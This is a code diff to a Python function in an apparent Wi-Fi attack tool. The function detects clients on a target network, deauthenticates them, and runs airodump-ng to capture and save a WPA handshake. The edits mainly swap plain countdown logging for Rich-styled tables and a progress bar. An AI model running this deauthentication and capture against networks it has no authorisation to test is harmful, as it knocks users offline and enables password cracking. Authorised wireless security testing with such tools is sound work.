@@ -9,40 +9,45 @@ from datetime import datetime
 from utils import colored_log, execute_command, sanitize_ssid, check_handshake
 from scanner import detect_connected_clients
 from rich.console import Console
+from rich.panel import Panel
+from rich.table import Table
 
-# Rich console setup
 console = Console()
 
 
 def capture_handshake(self, network) -> str | None:
-    """Capture handshake from target network with countdown"""
+    """Capture handshake from target network - original fast logic with Rich display"""
     if not self.monitor_interface:
         colored_log("error", "No monitor mode interface found!")
         return None
 
-    # Detect connected clients
-    clients = detect_connected_clients(self, network)
+    clients = detect_connected_clients(self, network, duration=15)
     if not clients:
-        colored_log(
-            "error",
-            f"No connected clients detected for {network.essid}. Stopping process...",
-        )
+        colored_log("error", f"No connected clients detected for {network.essid}.")
         return None
 
-    # Deauthenticate clients
+    client_table = Table(show_header=True, header_style="bold cyan", box=None)
+    client_table.add_column("#", style="bold", width=3)
+    client_table.add_column("Client MAC", style="green")
+    
+    for idx, client in enumerate(clients, 1):
+        client_table.add_row(str(idx), client)
+    
+    console.print(Panel(
+        client_table,
+        title=f"[bold green]✓ {len(clients)} Client(s) Detected[/bold green]",
+        border_style="green"
+    ))
+
     deauthenticate_clients(self, network, clients)
 
-    # Sanitize SSID for use in filename
     safe_essid = sanitize_ssid(network.essid)
-
-    # Create capture filename
     timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
     capture_name = f"{safe_essid}_{timestamp}"
     capture_path = os.path.join(self.temp_dir, capture_name)
 
     colored_log("info", f"Starting handshake capture for {network.essid}...")
 
-    # Start capture process
     capture_cmd = [
         "airodump-ng",
         "--bssid",
@@ -65,38 +70,36 @@ def capture_handshake(self, network) -> str | None:
         return None
 
     cap_file = f"{capture_path}-01.cap"
-    timeout = 60  # 1 minute
+    timeout = 60
     start_time = time.time()
+    
+    console.print(f"\n[bold cyan]📡 Capturing handshake for {network.essid}...[/bold cyan]")
+    
     try:
         while True:
             elapsed_time = int(time.time() - start_time)
             remaining_time = max(0, timeout - elapsed_time)
-            minutes, seconds = divmod(remaining_time, 60)
-            time_str = f"{minutes:02d}:{seconds:02d} remaining"
-            # Use rich console for styled countdown
+            
+            progress = int((elapsed_time / timeout) * 30)
+            bar = f"[{'█' * progress}{'░' * (30 - progress)}]"
+            
             console.print(
-                f"[*] Capturing handshake for {network.essid}: {time_str}",
-                style="bright_cyan",
-                end="\r",
+                f"[cyan]⏱  {elapsed_time}s / {timeout}s {bar}[/cyan]",
+                end="\r"
             )
-            sys.stdout.flush()
 
-            # Check for handshake directly in main thread
             if os.path.exists(cap_file) and check_handshake(cap_file):
-                console.print(f"{' ' * 80}", end="\r")  # Clear line
-                sys.stdout.flush()
-                colored_log("success", "Handshake detected!")
+                console.print(" " * 80, end="\r")
+                console.print("[bold green]✓ Handshake detected![/bold green]")
                 break
 
             if elapsed_time >= timeout:
-                console.print(f"{' ' * 80}", end="\r")  # Clear line
-                sys.stdout.flush()
+                console.print(" " * 80, end="\r")
                 colored_log("warning", "Handshake capture timed out after 1 minute!")
                 break
             time.sleep(1)
     except KeyboardInterrupt:
-        console.print(f"{' ' * 80}", end="\r")  # Clear line
-        sys.stdout.flush()
+        console.print(" " * 80, end="\r")
         colored_log("warning", "Capture cancelled by user!")
     finally:
         capture_proc.send_signal(signal.SIGTERM)
@@ -106,7 +109,6 @@ def capture_handshake(self, network) -> str | None:
         colored_log("error", "Failed to capture handshake after deauthentication!")
         return None
 
-    # Save handshake file
     final_path = os.path.join(self.handshake_dir, f"{safe_essid}.cap")
     shutil.copy(cap_file, final_path)
     colored_log("success", f"Handshake saved to {final_path}")
